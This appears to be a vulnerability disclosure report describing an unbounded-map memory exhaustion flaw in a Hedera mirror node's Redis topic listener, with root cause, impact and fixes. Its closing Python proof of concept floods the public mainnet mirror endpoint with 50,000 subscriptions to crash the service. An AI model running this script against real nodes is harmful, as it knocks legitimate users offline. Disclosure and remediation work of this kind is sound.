### Title
Unbounded `topicMessages` ConcurrentHashMap Growth via Distinct TopicId Subscription Flooding in `RedisTopicListener`

### Summary
`RedisTopicListener.getSharedListener()` unconditionally inserts one entry into the `topicMessages` ConcurrentHashMap per unique `topicId` with no cap on the number of distinct topics tracked. An unprivileged attacker who opens many concurrent gRPC subscriptions—each targeting a different valid `topicId`—can grow this map without bound, exhausting JVM heap and crashing the service, which disconnects all active subscribers.

### Finding Description
**Exact code path:**

In `RedisTopicListener.java` lines 59–62, `getSharedListener()` calls:
```java
Topic topic = getTopic(filter);
return topicMessages.computeIfAbsent(topic.getTopic(), key -> subscribe(topic));
```
`getTopic()` (lines 64–66) produces the key `"topic.<numericId>"` directly from `filter.getTopicId().getId()`. There is no guard on how many distinct keys may exist in `topicMessages`.

**Root cause:** `ListenerProperties` (lines 17–43) defines `maxBufferSize`, `maxPageSize`, and `prefetch`, but no `maxTopics` or `maxSubscriptions` field. `TopicMessageServiceImpl` tracks `subscriberCount` as a metric (line 48) but never enforces a ceiling on it. No rate-limiting or per-client connection cap exists anywhere in the call chain.

**Cleanup mechanism and why it is insufficient:** `subscribe()` (lines 68–80) attaches `doOnCancel(() -> unsubscribe(topic))` and `doOnComplete(() -> unsubscribe(topic))` to the shared Flux. Cleanup fires only when the **last** subscriber for a given topic disconnects. While the attacker keeps connections open, every distinct `topicId` retains its map entry and its live Redis channel subscription. The attacker simply never disconnects.

**Exploit flow:**
1. Attacker opens `N` long-lived gRPC streams (using multiple source IPs / a botnet to bypass per-IP TCP limits), each with a different valid `topicId`.
2. Each call reaches `TopicMessageServiceImpl.subscribeTopic()` → `topicExists()` (lines 94–106). If `grpcProperties.isCheckTopicExists()` is `true`, the attacker uses publicly enumerable Hedera entity IDs; if `false`, any integer suffices.
3. `topicListener.listen(newFilter)` → `RedisTopicListener.getSharedListener()` → `computeIfAbsent` inserts a new entry for each unseen `topicId`.
4. Each entry holds a Reactor Flux chain plus a live `ReactiveRedisMessageListenerContainer` channel subscription—several kilobytes of heap per entry.
5. At `N ≈ 50,000–200,000` (depending on JVM heap size), heap is exhausted → `OutOfMemoryError` → JVM crash → all existing subscribers are disconnected simultaneously.

### Impact Explanation
A JVM crash terminates every active gRPC stream on the node. All legitimate subscribers lose their live topic feeds with no graceful handoff. Because the Redis listener is the default mode (`ListenerType.REDIS` in `ListenerProperties` line 37), this affects the primary production path. The crash also tears down the Redis connection pool, so recovery requires a full service restart. This constitutes a complete, externally-triggered service outage—equivalent to a network partition from the subscribers' perspective.

### Likelihood Explanation
The attack requires only the ability to open many concurrent gRPC connections, which is a standard capability for any moderately resourced attacker (a single cloud VM with 1 Gbps can sustain tens of thousands of TCP connections). Valid Hedera topic IDs are publicly visible on-chain and via the REST mirror-node API, so the `checkTopicExists` guard does not raise the bar meaningfully. The attack is repeatable: after a service restart the attacker can immediately re-flood. No authentication or privileged credential is required.

### Recommendation
1. **Cap the map size**: Add a `maxTopics` field to `ListenerProperties` and enforce it in `getSharedListener()` before calling `computeIfAbsent`—reject or queue new topic subscriptions when the limit is reached.
2. **Per-client subscription limit**: Track subscriptions per remote peer (gRPC `Context` / interceptor) and reject requests that exceed a configurable per-client cap.
3. **Connection-level rate limiting**: Add a gRPC `ServerInterceptor` that enforces a maximum number of concurrent streams per source IP.
4. **Idle-subscription eviction**: Use a `Cache` with a TTL (e.g., Caffeine) instead of a raw `ConcurrentHashMap` so entries for topics with no recent traffic are evicted automatically.

### Proof of Concept
```python
# Requires: grpcio, hedera-sdk or raw proto stubs
# Enumerate ~50,000 valid topic IDs from the public mirror REST API, then:

import grpc, threading, consensus_service_pb2_grpc as cs, consensus_service_pb2 as cp

MIRROR = "mainnet-public.mirrornode.hedera.com:443"
channel_pool = []

def subscribe(topic_num):
    ch = grpc.secure_channel(MIRROR, grpc.ssl_channel_credentials())
    channel_pool.append(ch)
    stub = cs.ConsensusServiceStub(ch)
    req = cp.ConsensusTopicQuery(topicID=cp.TopicID(topicNum=topic_num))
    # Block forever — keep the subscription alive
    for _ in stub.subscribeTopic(req):
        pass

threads = [threading.Thread(target=subscribe, args=(i,), daemon=True)
           for i in range(1, 50_001)]   # 50k distinct topicIds
for t in threads:
    t.start()
# After all threads are running, the topicMessages map on the mirror node
# holds ~50,000 entries + Redis subscriptions → heap exhaustion → OOM crash.
input("Press enter to release connections (cleanup)")
```
Expected result: mirror-node gRPC service throws `OutOfMemoryError` and restarts; all legitimate subscribers are disconnected.